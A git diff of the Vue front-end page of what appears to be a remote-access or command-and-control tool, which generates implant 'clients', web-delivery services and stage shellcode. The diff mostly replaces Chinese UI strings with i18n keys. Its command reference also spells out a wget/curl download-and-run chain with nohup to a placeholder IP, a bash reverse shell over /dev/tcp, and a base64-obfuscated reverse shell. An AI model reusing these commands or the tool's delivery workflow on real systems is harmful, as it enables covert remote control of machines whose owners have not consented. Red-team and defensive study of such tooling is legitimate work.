@@ -3,8 +3,8 @@
     <!-- 头部区域 -->
     <div class="header-section">
       <div class="header-content">
-        <h1 class="page-title">客户端生成</h1>
-        <p class="page-subtitle">配置并生成适用于不同系统的远程客户端</p>
+        <h1 class="page-title">{{ t('gen.title') }}</h1>
+        <p class="page-subtitle">{{ t('gen.subtitle') }}</p>
       </div>
     </div>
 
@@ -39,10 +39,10 @@
           <div class="card-header">
             <div class="header-left">
               <el-icon class="card-icon"><Setting /></el-icon>
-              <h3 class="card-title">生成配置</h3>
+              <h3 class="card-title">{{ t('gen.configTitle') }}</h3>
             </div>
             <div class="header-right">
-              <el-tag type="success" size="small">实时生成</el-tag>
+              <el-tag type="success" size="small">{{ t('gen.realtime') }}</el-tag>
             </div>
           </div>
         </template>
@@ -58,9 +58,9 @@
             </div>
             <div class="toggle-label">
       <span class="toggle-text" :class="{ 'active-text': formData.isForwardClient }">
-        {{ formData.isForwardClient ? '正向模式已开启' : '正向模式已关闭' }}
+        {{ formData.isForwardClient ? t('gen.forwardOn') : t('gen.forwardOff') }}
       </span>
-              <el-tooltip content="正向客户端将主动监听指定端口，等待服务端连接" placement="right">
+              <el-tooltip :content="t('gen.forwardTip')" placement="right">
                 <el-icon class="toggle-help-icon"><InfoFilled /></el-icon>
               </el-tooltip>
             </div>
@@ -70,7 +70,7 @@
           <el-form :model="formData" label-position="top" class="generator-form">
             <!-- Listener 选择 -->
             <!-- 监听器选择 / 正向客户端配置 -->
-            <el-form-item :label="formData.isForwardClient ? '正向客户端配置' : '监听器'" required>
+            <el-form-item :label="formData.isForwardClient ? t('gen.forwardConfig') : t('listener.title')" required>
               <!-- 正向客户端模式 -->
               <template v-if="formData.isForwardClient">
                 <div class="forward-config">
@@ -78,7 +78,7 @@
                     <div class="forward-type">
                       <el-select
                           v-model="formData.forwardType"
-                          placeholder="连接方式"
+                          :placeholder="t('gen.connMethod')"
                           class="forward-select"
                           size="large"
                       >
@@ -109,7 +109,7 @@
                       </el-input>
                     </div>
                   </div>
-                  <div class="form-hint">正向客户端监听的地址格式: IP:端口</div>
+                  <div class="form-hint">{{ t('gen.forwardAddrHint') }}</div>
                 </div>
               </template>
 
@@ -117,7 +117,7 @@
               <template v-else>
                 <el-select
                     v-model="formData.listener"
-                    placeholder="选择监听器"
+                    :placeholder="t('gen.pickListener')"
                     class="form-select"
                     @visible-change="handleDropdown"
                     :loading="loadingListeners"
@@ -139,17 +139,17 @@
                     </div>
                   </el-option>
                   <template #empty>
-                    <div class="empty-option">暂无可用监听器</div>
+                    <div class="empty-option">{{ t('gen.noListeners') }}</div>
                   </template>
                 </el-select>
-                <div class="form-hint">选择客户端连接的监听器地址</div>
+                <div class="form-hint">{{ t('gen.listenerHint') }}</div>
               </template>
 
 
             </el-form-item>
 
             <!-- 操作系统选择 -->
-            <el-form-item label="操作系统" required>
+            <el-form-item :label="t('gen.os')" required>
               <div class="os-selector">
                 <div
                     v-for="os in osOptions"
@@ -166,7 +166,7 @@
                   <div class="os-info">
                     <div class="os-name">{{ os.label }}</div>
                     <div class="os-arch-count">
-                      {{ archMapping[os.value]?.length || 0 }} 种架构
+                      {{ archMapping[os.value]?.length || 0 }} {{ t('gen.archCount') }}
                     </div>
                   </div>
                   <el-icon
@@ -180,7 +180,7 @@
             </el-form-item>
 
             <!-- 架构选择 -->
-            <el-form-item label="系统架构" required>
+            <el-form-item :label="t('gen.arch')" required>
               <div class="arch-grid">
                 <div
                     v-for="arch in archOptions"
@@ -201,15 +201,15 @@
                   </div>
                 </div>
               </div>
-              <div class="form-hint">根据目标系统选择合适的处理器架构</div>
+              <div class="form-hint">{{ t('gen.archHint') }}</div>
             </el-form-item>
 
             <!-- 上线密码 -->
-            <el-form-item label="连接密码">
+            <el-form-item :label="t('gen.connPwd')">
               <div class="password-input-wrapper">
                 <el-input
                     v-model="formData.pass"
-                    placeholder="输入客户端连接密码"
+                    :placeholder="t('gen.connPwdPh')"
                     type="password"
                     show-password
                     clearable
@@ -221,7 +221,7 @@
                     <el-icon><Lock /></el-icon>
                   </template>
                 </el-input>
-                <el-tooltip content="生成随机密码" placement="top">
+                <el-tooltip :content="t('gen.genRandomPwd')" placement="top">
                   <el-button
                       class="generate-password-btn"
                       @click="generateRandomPassword"
@@ -231,7 +231,7 @@
                   />
                 </el-tooltip>
               </div>
-              <div class="form-hint">客户端连接时使用的验证密码（可选，8-32位字符）</div>
+              <div class="form-hint">{{ t('gen.connPwdHint') }}</div>
               <div v-if="formData.pass" class="password-strength">
                 <div class="strength-meter">
                   <div
@@ -239,7 +239,7 @@
                       :style="{ width: `${passwordStrength}%` }"
                   ></div>
                 </div>
-                <span class="strength-text">密码强度：{{ passwordStrengthText }}</span>
+                <span class="strength-text">{{ t('gen.pwdStrength') }}{{ passwordStrengthText }}</span>
               </div>
             </el-form-item>
 
@@ -254,10 +254,10 @@
                   size="large"
               >
                 <el-icon><Download /></el-icon>
-                生成客户端
+                {{ t('gen.generate') }}
               </el-button>
               <div class="form-hint" v-if="isFormValid">
-                将生成 {{ getFileName() }} 客户端文件
+                {{ t('gen.willGenerate') }} {{ getFileName() }}
               </div>
             </el-form-item>
           </el-form>
@@ -270,17 +270,17 @@
           <div class="card-header">
             <div class="header-left">
               <el-icon class="card-icon"><Promotion /></el-icon>
-              <h3 class="card-title">使用命令参考</h3>
+              <h3 class="card-title">{{ t('gen.cmdRefTitle') }}</h3>
             </div>
             <div class="header-right">
-              <el-tooltip content="复制所有命令" placement="top">
+              <el-tooltip :content="t('gen.copyAll')" placement="top">
                 <el-button
                     type="info"
                     size="small"
                     :icon="CopyDocument"
                     @click="copyAllCommands"
                 >
-                  一键复制
+                  {{ t('gen.copyAll') }}
                 </el-button>
               </el-tooltip>
             </div>
@@ -301,7 +301,7 @@
                 </el-icon>
                 <span class="type-name">{{ cmd.name }}</span>
               </div>
-              <el-tooltip content="复制命令" placement="top">
+              <el-tooltip :content="t('common.copy')" placement="top">
                 <el-button
                     type="text"
                     :icon="CopyDocument"
@@ -328,7 +328,7 @@
             <el-icon class="stat-icon total-icon"><DataLine /></el-icon>
             <div class="stat-info">
               <div class="stat-value">{{ webTableData.length }}</div>
-              <div class="stat-label">总数</div>
+              <div class="stat-label">{{ t('listener.total') }}</div>
             </div>
           </div>
         </el-card>
@@ -338,7 +338,7 @@
             <el-icon class="stat-icon active-icon"><CircleCheck /></el-icon>
             <div class="stat-info">
               <div class="stat-value">{{ activeDeliveries }}</div>
-              <div class="stat-label">活跃</div>
+              <div class="stat-label">{{ t('listener.active') }}</div>
             </div>
           </div>
         </el-card>
@@ -348,7 +348,7 @@
             <el-icon class="stat-icon inactive-icon"><CircleClose /></el-icon>
             <div class="stat-info">
               <div class="stat-value">{{ inactiveDeliveries }}</div>
-              <div class="stat-label">未启动</div>
+              <div class="stat-label">{{ t('listener.inactive') }}</div>
             </div>
           </div>
         </el-card>
@@ -358,7 +358,7 @@
       <el-card class="main-table-card" shadow="hover">
         <template #header>
           <div class="table-header">
-            <h3 class="table-title">WebDelivery 列表</h3>
+            <h3 class="table-title">{{ t('gen.webListTitle') }}</h3>
             <div class="table-actions">
               <el-button
                   type="primary"
@@ -366,9 +366,9 @@
                   @click="dialogVisible = true"
               >
                 <el-icon><Plus /></el-icon>
-                新增
+                {{ t('common.add') }}
               </el-button>
-              <el-tooltip content="刷新列表" placement="top">
+              <el-tooltip :content="t('common.refresh')" placement="top">
                 <el-button
                     type="info"
                     size="small"
@@ -386,21 +386,21 @@
             :data="webTableData"
             class="custom-table"
             v-loading="webLoading"
-            empty-text="暂无WebDelivery数据"
+            :empty-text="t('gen.webEmpty')"
         >
-          <el-table-column prop="ListenerConfig" label="监听器" min-width="180">
+          <el-table-column prop="ListenerConfig" :label="t('gen.listenerCol')" min-width="180">
             <template #default="{ row }">
               <div class="listener-cell">
                 <el-icon class="listener-icon"><Connection /></el-icon>
                 <div class="listener-content">
                   <div class="listener-text">{{ row.ListenerConfig }}</div>
-                  <div class="listener-label">监听器配置</div>
+                  <div class="listener-label">{{ t('gen.listenerCol') }}</div>
                 </div>
               </div>
             </template>
           </el-table-column>
 
-          <el-table-column prop="OS" label="操作系统" width="140">
+          <el-table-column prop="OS" :label="t('gen.os')" width="140">
             <template #default="{ row }">
               <el-tag
                   :type="row.OS === 'windows' ? 'primary' : row.OS === 'linux' ? 'success' : 'info'"
@@ -413,7 +413,7 @@
             </template>
           </el-table-column>
 
-          <el-table-column prop="Arch" label="架构" width="120">
+          <el-table-column prop="Arch" :label="t('gen.arch')" width="120">
             <template #default="{ row }">
               <div class="arch-cell">
                 <el-icon class="arch-icon"><Cpu /></el-icon>
@@ -422,16 +422,16 @@
             </template>
           </el-table-column>
 
-          <el-table-column prop="Pass" label="上线密码" width="150">
+          <el-table-column prop="Pass" :label="t('gen.onlinePwd')" width="150">
             <template #default="{ row }">
               <div class="password-cell">
                 <el-icon class="password-icon"><Lock /></el-icon>
-                <span class="password-text">{{ row.Pass || '未设置' }}</span>
+                <span class="password-text">{{ row.Pass || t('gen.notSet') }}</span>
               </div>
             </template>
           </el-table-column>
 
-          <el-table-column prop="ListeningPort" label="监听端口" width="120">
+          <el-table-column prop="ListeningPort" :label="t('gen.listenPort')" width="120">
             <template #default="{ row }">
               <div class="port-cell">
                 <el-tag type="info" effect="plain" class="port-tag">
@@ -441,7 +441,7 @@
             </template>
           </el-table-column>
 
-          <el-table-column label="状态" width="120">
+          <el-table-column :label="t('common.status')" width="120">
             <template #default="{ row }">
               <div class="status-cell">
                 <div
@@ -454,13 +454,13 @@
                     class="status-tag"
                     effect="light"
                 >
-                  {{ row.Status === 1 ? '运行中' : '已停止' }}
+                  {{ row.Status === 1 ? t('listener.running') : t('listener.stopped') }}
                 </el-tag>
               </div>
             </template>
           </el-table-column>
 
-          <el-table-column label="操作" width="280">
+          <el-table-column :label="t('common.actions')" width="280">
             <template #default="{ row }">
               <div class="action-buttons">
                 <el-popover
@@ -476,13 +476,13 @@
                         :disabled="row.Status !== 1"
                         class="action-btn"
                     >
-                      <el-tooltip content="查看上线命令" placement="top">
+                      <el-tooltip :content="t('gen.viewCmd')" placement="top">
                         <el-icon><Promotion /></el-icon>
                       </el-tooltip>
                     </el-button>
                   </template>
                   <div class="command-content">
-                    <h4 class="command-title">上线命令</h4>
+                    <h4 class="command-title">{{ t('gen.onlineCmd') }}</h4>
                     <pre class="command-code">{{ generateWebCommand(row) }}</pre>
                     <div class="command-actions">
                       <el-button
@@ -491,7 +491,7 @@
                           @click="copyToClipboard(generateWebCommand(row))"
                       >
                         <el-icon><CopyDocument /></el-icon>
-                        复制命令
+                        {{ t('common.copy') }}
                       </el-button>
                     </div>
                   </div>
@@ -499,7 +499,7 @@
 
                 <el-tooltip
                     v-if="row.OS === 'windows' && row.Status === 1"
-                    content="生成Shellcode"
+                    :content="t('gen.genShellcode')"
                     placement="top"
                 >
                   <el-button
@@ -513,7 +513,7 @@
                 </el-tooltip>
 
                 <el-tooltip
-                    :content="row.Status === 1 ? '停止服务' : '启动服务'"
+                    :content="row.Status === 1 ? t('gen.stopService') : t('gen.startService')"
                     placement="top"
                 >
                   <el-button
@@ -528,7 +528,7 @@
                   </el-button>
                 </el-tooltip>
 
-                <el-tooltip content="删除" placement="top">
+                <el-tooltip :content="t('common.delete')" placement="top">
                   <el-button
                       size="small"
                       type="danger"
@@ -548,17 +548,17 @@
     <!-- WebDelivery新增对话框 -->
     <el-dialog
         v-model="dialogVisible"
-        title="配置 WebDelivery"
+        :title="t('gen.configWeb')"
         width="750px"
         class="add-dialog"
         :close-on-click-modal="false"
     >
       <div class="dialog-content">
         <el-form :model="webFormData" label-position="top" class="config-form">
-          <el-form-item label="监听器" required>
+          <el-form-item :label="t('gen.listenerCol')" required>
             <el-select
                 v-model="webFormData.listener"
-                placeholder="选择监听器"
+                :placeholder="t('gen.pickListener')"
                 class="form-select"
                 @visible-change="handleDropdown"
                 :loading="loadingListeners"
@@ -582,14 +582,14 @@
                 </div>
               </el-option>
               <template #empty>
-                <div class="empty-option">暂无可用监听器</div>
+                <div class="empty-option">{{ t('gen.noListeners') }}</div>
               </template>
             </el-select>
-            <div class="form-hint">客户端连接的监听器地址</div>
+            <div class="form-hint">{{ t('gen.listenerHint') }}</div>
           </el-form-item>
 
           <div class="row-group">
-            <el-form-item label="操作系统" required class="half-width">
+            <el-form-item :label="t('gen.os')" required class="half-width">
               <div class="os-selector">
                 <div
                     v-for="os in osOptions"
@@ -608,10 +608,10 @@
               </div>
             </el-form-item>
 
-            <el-form-item label="系统架构" required class="half-width">
+            <el-form-item :label="t('gen.arch')" required class="half-width">
               <el-select
                   v-model="webFormData.arch"
-                  placeholder="选择架构"
+                  :placeholder="t('gen.pickArch')"
                   :disabled="!webFormData.os"
                   size="large"
                   class="arch-select"
@@ -636,10 +636,10 @@
           </div>
 
           <div class="row-group">
-            <el-form-item label="监听端口" required class="half-width">
+            <el-form-item :label="t('gen.listenPort')" required class="half-width">
               <el-input
                   v-model="webFormData.port"
-                  placeholder="如: 8080"
+                  :placeholder="t('gen.portExample')"
                   size="large"
                   clearable
               >
@@ -647,13 +647,13 @@
                   <el-icon><Monitor /></el-icon>
                 </template>
               </el-input>
-              <div class="form-hint">Web服务的监听端口</div>
+              <div class="form-hint">{{ t('gen.webPortHint') }}</div>
             </el-form-item>
 
-            <el-form-item label="文件名称" class="half-width">
+            <el-form-item :label="t('gen.fileName')" class="half-width">
               <el-input
                   v-model="webFormData.filename"
-                  placeholder="如: download.exe"
+                  :placeholder="t('gen.fileNameExample')"
                   size="large"
                   clearable
               >
@@ -661,15 +661,15 @@
                   <el-icon><Document /></el-icon>
                 </template>
               </el-input>
-              <div class="form-hint">客户端文件下载名称</div>
+              <div class="form-hint">{{ t('gen.fileNameHint') }}</div>
             </el-form-item>
           </div>
 
-          <el-form-item label="连接密码">
+          <el-form-item :label="t('gen.connPwd')">
             <div class="password-input-wrapper">
               <el-input
                   v-model="webFormData.pass"
-                  placeholder="可选，客户端连接密码"
+                  :placeholder="t('gen.connPwdOptional')"
                   type="password"
                   show-password
                   clearable
@@ -682,7 +682,7 @@
                   <el-icon><Lock /></el-icon>
                 </template>
               </el-input>
-              <el-tooltip content="生成随机密码" placement="top">
+              <el-tooltip :content="t('gen.genRandomPwd')" placement="top">
                 <el-button
                     class="generate-password-btn"
                     @click="generateRandomWebPassword"
@@ -692,7 +692,7 @@
                 />
               </el-tooltip>
             </div>
-            <div class="form-hint">客户端连接验证密码（可选）</div>
+            <div class="form-hint">{{ t('gen.connPwdHint2') }}</div>
           </el-form-item>
 
         </el-form>
@@ -701,7 +701,7 @@
       <template #footer>
         <div class="dialog-footer">
           <el-button @click="dialogVisible = false" :disabled="submitting">
-            取消
+            {{ t('common.cancel') }}
           </el-button>
           <el-button
               type="primary"
@@ -710,8 +710,8 @@
               :disabled="!isWebFormValid"
           >
             <template #default>
-              <span v-if="!submitting">创建 WebDelivery</span>
-              <span v-else>创建中...</span>
+              <span v-if="!submitting">{{ t('gen.createWeb') }}</span>
+              <span v-else>{{ t('gen.creating') }}</span>
             </template>
           </el-button>
         </div>
@@ -721,7 +721,7 @@
     <!-- Shellcode生成对话框 -->
     <el-dialog
         v-model="dialogVisible2"
-        title="生成 Stage Shellcode"
+        :title="t('gen.stageScTitle')"
         width="480px"
         class="shellcode-dialog"
         :close-on-click-modal="false"
@@ -729,17 +729,17 @@
       <div class="dialog-content">
         <div class="shellcode-info">
           <div class="info-item">
-            <span class="info-label">监听器：</span>
+            <span class="info-label">{{ t('gen.listenerCol') }}:</span>
             <span class="info-value">{{ selectedListener }}</span>
           </div>
           <div class="info-item">
-            <span class="info-label">端口：</span>
+            <span class="info-label">{{ t('gen.listenPort') }}:</span>
             <span class="info-value">{{ selectedPort }}</span>
           </div>
         </div>
 
         <el-form :model="selectedFormat" label-position="top" class="format-form">
-          <el-form-item label="输出格式" required>
+          <el-form-item :label="t('gen.outputFormat')" required>
             <div class="format-grid">
               <div
                   v-for="format in formatOptions"
@@ -772,7 +772,7 @@
       <template #footer>
         <div class="dialog-footer">
           <el-button @click="dialogVisible2 = false">
-            取消
+            {{ t('common.cancel') }}
           </el-button>
           <el-button
               type="primary"
@@ -780,7 +780,7 @@
               :loading="generatinBackendTemplatecode"
               :disabled="!selectedFormat.format"
           >
-            生成并下载
+            {{ t('gen.genDownload') }}
           </el-button>
         </div>
       </template>
@@ -789,6 +789,8 @@
 </template>
 
 <script setup lang="ts">
+import { useI18n } from 'vue-i18n'
+const { t } = useI18n()
 import { reactive, ref, computed, onMounted } from 'vue';
 import { ElMessage, ElMessageBox } from 'element-plus';
 import {
@@ -821,10 +823,10 @@ import {
 import ClientAPI from "@/api/clients";
 
 // 功能选项
-const functions = [
-  { label: '客户端生成', value: 'client', icon: Download, description: '生成独立的客户端可执行程序' },
-  { label: 'Web投递', value: 'web', icon: Promotion, description: '通过Web服务投递客户端程序' }
-];
+const functions = computed(() => [
+  { label: t('gen.funcClient'), value: 'client', icon: Download, description: t('gen.funcClientDesc') },
+  { label: t('gen.funcWeb'), value: 'web', icon: Promotion, description: t('gen.funcWebDesc') }
+]);
 
 const activeFunction = ref('client');
 
@@ -843,17 +845,17 @@ const archMapping: Record<string, string[]> = {
 };
 
 // 架构描述
-const archDescriptions: Record<string, string> = {
-  'amd64': '64位 x86 架构 (Intel/AMD)',
-  '386': '32位 x86 架构',
-  'arm': 'ARM 架构 (32位)',
-  'arm64': 'ARM 64位架构',
-  'loong64': '龙芯架构',
-  'mips': 'MIPS 架构 (大端)',
-  'mipsle': 'MIPS 架构 (小端)',
-  'mips64': 'MIPS 64位 (大端)',
-  'mips64le': 'MIPS 64位 (小端)'
-};
+const archDescriptions = computed<Record<string, string>>(() => ({
+  'amd64': t('gen.archAmd64'),
+  '386': t('gen.arch386'),
+  'arm': t('gen.archArm'),
+  'arm64': t('gen.archArm64'),
+  'loong64': t('gen.archLoong64'),
+  'mips': t('gen.archMips'),
+  'mipsle': t('gen.archMipsle'),
+  'mips64': t('gen.archMips64'),
+  'mips64le': t('gen.archMips64le')
+}));
 // 正向客户端切换处理
 const handleForwardClientChange = (value: boolean) => {
   if (value) {
@@ -868,12 +870,12 @@ const getForwardListenerString = () => {
   return `forward-${formData.forwardType}://${formData.forwardAddress}`;
 };
 // 格式选项
-const formatOptions = [
-  { value: 'hex', label: '十六进制', icon: Warning, description: 'HEX格式Shellcode' },
-  { value: 'c', label: 'C 数组', icon: Document, description: 'C语言数组格式' },
-  { value: 'bin', label: '二进制', icon: SuccessFilled, description: '原始二进制文件' },
-  { value: 'exe', label: '可执行程序', icon: Download, description: 'Windows可执行文件' }
-];
+const formatOptions = computed(() => [
+  { value: 'hex', label: t('gen.fmtHex'), icon: Warning, description: t('gen.fmtHexDesc') },
+  { value: 'c', label: t('gen.fmtC'), icon: Document, description: t('gen.fmtCDesc') },
+  { value: 'bin', label: t('gen.fmtBin'), icon: SuccessFilled, description: t('gen.fmtBinDesc') },
+  { value: 'exe', label: t('gen.fmtExe'), icon: Download, description: t('gen.fmtExeDesc') }
+]);
 
 // 客户端生成相关
 const listenerOptions = ref<string[]>([]);
@@ -946,54 +948,54 @@ const passwordStrength = computed(() => {
 
 const passwordStrengthText = computed(() => {
   const strength = passwordStrength.value;
-  if (strength <= 40) return '弱';
-  if (strength <= 70) return '中';
-  return '强';
+  if (strength <= 40) return t('user.strengthWeak');
+  if (strength <= 70) return t('user.strengthMid');
+  return t('user.strengthStrong');
 });
 
 // 命令参考
-const commands = [
+const commands = computed(() => [
   {
-    name: '直接运行',
-    code: './r_linux_amd64 [上线密码]',
-    description: '直接运行客户端程序',
+    name: t('gen.cmdDirect'),
+    code: './r_linux_amd64 [password]',
+    description: t('gen.cmdDirectDesc'),
     icon: Odometer
   },
   {
-    name: 'Wget下载',
-    code: 'wget -P /tmp http://xxx.xxx.xxx.xxx:8000/r_linux_amd64; chmod +x /tmp/r_linux_amd64; nohup /tmp/r_linux_amd64 [上线密码] > /dev/null 2>&1 &',
-    description: '使用 wget 下载并运行',
+    name: t('gen.cmdWget'),
+    code: 'wget -P /tmp http://xxx.xxx.xxx.xxx:8000/r_linux_amd64; chmod +x /tmp/r_linux_amd64; nohup /tmp/r_linux_amd64 [password] > /dev/null 2>&1 &',
+    description: t('gen.cmdWgetDesc'),
     icon: Download
   },
   {
-    name: 'Curl下载',
-    code: 'curl -o /tmp/r_linux_amd64 http://xxx.xxx.xxx.xxx:8000/r_linux_amd64; chmod +x /tmp/r_linux_amd64; nohup /tmp/r_linux_amd64 [上线密码] > /dev/null 2>&1 &',
-    description: '使用 curl 下载并运行',
+    name: t('gen.cmdCurl'),
+    code: 'curl -o /tmp/r_linux_amd64 http://xxx.xxx.xxx.xxx:8000/r_linux_amd64; chmod +x /tmp/r_linux_amd64; nohup /tmp/r_linux_amd64 [password] > /dev/null 2>&1 &',
+    description: t('gen.cmdCurlDesc'),
     icon: Download
   },
   {
-    name: 'Bash反弹',
+    name: t('gen.cmdBash'),
     code: 'bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/2333 0>&1',
-    description: 'Bash 反弹 Shell',
+    description: t('gen.cmdBashDesc'),
     icon: ChatLineSquare
   },
   {
-    name: 'Base64反弹',
+    name: t('gen.cmdBase64'),
     code: 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMjMzMyAwPiYx}|{base64,-d}|{bash,-i}',
-    description: 'Base64 编码的反弹 Shell',
+    description: t('gen.cmdBase64Desc'),
     icon: MagicStick
   },
   {
-    name: '后台运行',
-    code: 'nohup ./client [密码] > /dev/null 2>&1 &',
-    description: '在后台静默运行客户端',
+    name: t('gen.cmdNohup'),
+    code: 'nohup ./client [password] > /dev/null 2>&1 &',
+    description: t('gen.cmdNohupDesc'),
     icon: SwitchButton
   }
-];
+]);
 
 // 方法
 const getArchDescription = (arch: string) => {
-  return archDescriptions[arch] || '未知架构';
+  return archDescriptions.value[arch] || t('gen.archUnknown');
 };
 
 const getFileName = () => {
@@ -1019,11 +1021,11 @@ const handleDropdown = async (visible: boolean) => {
       if (res.status === 200 && res.data.status === 200) {
         listenerOptions.value = res.data.data;
       } else {
-        ElMessage.error(res.data?.data || '获取监听器列表失败');
+        ElMessage.error(res.data?.data || t('listener.loadFailed'));
       }
     } catch (error) {
-      console.error('获取监听器失败:', error);
-      ElMessage.error('获取监听器列表失败');
+      console.error('failed to load listeners:', error);
+      ElMessage.error(t('listener.loadFailed'));
     } finally {
       loadingListeners.value = false;
     }
@@ -1054,7 +1056,7 @@ const generateRandomPassword = () => {
     password += chars.charAt(Math.floor(Math.random() * chars.length));
   }
   formData.pass = password;
-  ElMessage.success('已生成随机密码');
+  ElMessage.success(t('gen.randomPwdOk'));
 };
 
 const generateRandomWebPassword = () => {
@@ -1065,12 +1067,12 @@ const generateRandomWebPassword = () => {
     password += chars.charAt(Math.floor(Math.random() * chars.length));
   }
   webFormData.pass = password;
-  ElMessage.success('已生成随机密码');
+  ElMessage.success(t('gen.randomPwdOk'));
 };
 
 const handleGenerate = async () => {
   if (!isFormValid.value) {
-    ElMessage.warning('请填写完整的配置信息');
+    ElMessage.warning(t('listener.configIncomplete'));
     return;
   }
 
@@ -1110,13 +1112,13 @@ const handleGenerate = async () => {
       document.body.removeChild(downloadElement);
       window.URL.revokeObjectURL(href);
 
-      ElMessage.success('客户端生成成功，开始下载');
+      ElMessage.success(t('gen.generateOk'));
     } else {
-      ElMessage.error('生成失败，请稍后重试');
+      ElMessage.error(t('gen.generateFailed'));
     }
   } catch (error: any) {
-    console.error('生成失败:', error);
-    ElMessage.error(error.message || '生成客户端失败');
+    console.error('generate failed:', error);
+    ElMessage.error(error.message || t('gen.generateFailed'));
   } finally {
     generating.value = false;
   }
@@ -1124,14 +1126,14 @@ const handleGenerate = async () => {
 
 const copyToClipboard = (text: string) => {
   navigator.clipboard.writeText(text).then(() => {
-    ElMessage.success('命令已复制到剪贴板');
+    ElMessage.success(t('common.copied'));
   }).catch(() => {
-    ElMessage.error('复制失败，请手动复制');
+    ElMessage.error(t('gen.copyFailed'));
   });
 };
 
 const copyAllCommands = () => {
-  const allCommands = commands.map(cmd => `# ${cmd.name}\n${cmd.code}\n`).join('\n');
+  const allCommands = commands.value.map(cmd => `# ${cmd.name}\n${cmd.code}\n`).join('\n');
   copyToClipboard(allCommands);
 };
 
@@ -1143,11 +1145,11 @@ const getWebDeliveryList = async () => {
     if (res.status === 200 && res.data.status === 200) {
       webTableData.value = res.data.data;
     } else {
-      ElMessage.error(res.data?.data || '获取列表失败');
+      ElMessage.error(res.data?.data || t('gen.webListFailed'));
     }
   } catch (error) {
-    console.error('获取WebDelivery列表失败:', error);
-    ElMessage.error('获取列表失败');
+    console.error('failed to load WebDelivery list:', error);
+    ElMessage.error(t('gen.webListFailed'));
   } finally {
     webLoading.value = false;
   }
@@ -1155,7 +1157,7 @@ const getWebDeliveryList = async () => {
 
 const handleWebDelivery = async () => {
   if (!isWebFormValid.value) {
-    ElMessage.warning('请填写完整的配置信息');
+    ElMessage.warning(t('listener.configIncomplete'));
     return;
   }
 
@@ -1171,16 +1173,16 @@ const handleWebDelivery = async () => {
     });
 
     if (res.status === 200 && res.data.status === 200) {
-      ElMessage.success('WebDelivery 创建成功');
+      ElMessage.success(t('gen.webCreated'));
       dialogVisible.value = false;
       resetWebForm();
       await getWebDeliveryList();
     } else {
-      ElMessage.error(res.data?.data || '创建失败');
+      ElMessage.error(res.data?.data || t('gen.createFailed'));
     }
   } catch (error) {
-    console.error('创建WebDelivery失败:', error);
-    ElMessage.error('创建失败');
+    console.error('failed to create WebDelivery:', error);
+    ElMessage.error(t('gen.createFailed'));
   } finally {
     submitting.value = false;
   }
@@ -1190,14 +1192,14 @@ const handleWebClose = async (row: any) => {
   try {
     const res = await ClientAPI.CloseWebDelivery({ port: row.ListeningPort });
     if (res.status === 200 && res.data.status === 200) {
-      ElMessage.success('已停止服务');
+      ElMessage.success(t('gen.serviceStopped'));
       await getWebDeliveryList();
     } else {
-      ElMessage.error(res.data?.data || '停止失败');
+      ElMessage.error(res.data?.data || t('gen.stopFailed'));
     }
   } catch (error) {
-    console.error('停止WebDelivery失败:', error);
-    ElMessage.error('停止失败');
+    console.error('failed to stop WebDelivery:', error);
+    ElMessage.error(t('gen.stopFailed'));
   }
 };
 
@@ -1205,40 +1207,40 @@ const handleWebOpen = async (row: any) => {
   try {
     const res = await ClientAPI.OpenWebDelivery({ port: row.ListeningPort });
     if (res.status === 200 && res.data.status === 200) {
-      ElMessage.success('服务已启动');
+      ElMessage.success(t('gen.serviceStarted'));
       await getWebDeliveryList();
     } else {
-      ElMessage.error(res.data?.data || '启动失败');
+      ElMessage.error(res.data?.data || t('gen.startFailed'));
     }
   } catch (error) {
-    console.error('启动WebDelivery失败:', error);
-    ElMessage.error('启动失败');
+    console.error('failed to start WebDelivery:', error);
+    ElMessage.error(t('gen.startFailed'));
   }
 };
 
 const handleWebDelete = async (row: any) => {
   try {
     await ElMessageBox.confirm(
-        `确定要删除端口 ${row.ListeningPort} 的WebDelivery服务吗？`,
-        '删除确认',
+        t('gen.webDeleteConfirm', { port: row.ListeningPort }),
+        t('listener.deleteTitle'),
         {
-          confirmButtonText: '确定',
-          cancelButtonText: '取消',
+          confirmButtonText: t('common.confirm'),
+          cancelButtonText: t('common.cancel'),
           type: 'warning'
         }
     );
 
     const res = await ClientAPI.DeleteWebDelivery({ port: row.ListeningPort });
     if (res.status === 200 && res.data.status === 200) {
-      ElMessage.success('删除成功');
+      ElMessage.success(t('common.deleted'));
       await getWebDeliveryList();
     } else {
-      ElMessage.error(res.data?.data || '删除失败');
+      ElMessage.error(res.data?.data || t('common.deleteFailed'));
     }
   } catch (error) {
     if (error !== 'cancel') {
-      console.error('删除WebDelivery失败:', error);
-      ElMessage.error('删除失败');
+      console.error('failed to delete WebDelivery:', error);
+      ElMessage.error(t('common.deleteFailed'));
     }
   }
 };
@@ -1252,7 +1254,7 @@ const openShellcodeDialog = (row: any) => {
 
 const handleStageShellcode = async () => {
   if (!selectedFormat.format) {
-    ElMessage.warning('请选择输出格式');
+    ElMessage.warning(t('gen.pickFormat'));
     return;
   }
 
@@ -1282,14 +1284,14 @@ const handleStageShellcode = async () => {
       document.body.removeChild(downloadElement);
       window.URL.revokeObjectURL(href);
 
-      ElMessage.success('Shellcode生成成功，开始下载');
+      ElMessage.success(t('gen.scOk'));
       dialogVisible2.value = false;
     } else {
-      ElMessage.error('生成失败');
+      ElMessage.error(t('gen.generateFailed'));
     }
   } catch (error) {
-    console.error('生成Shellcode失败:', error);
-    ElMessage.error('生成失败');
+    console.error('failed to generate shellcode:', error);
+    ElMessage.error(t('gen.generateFailed'));
   } finally {
     generatinBackendTemplatecode.value = false;
   }
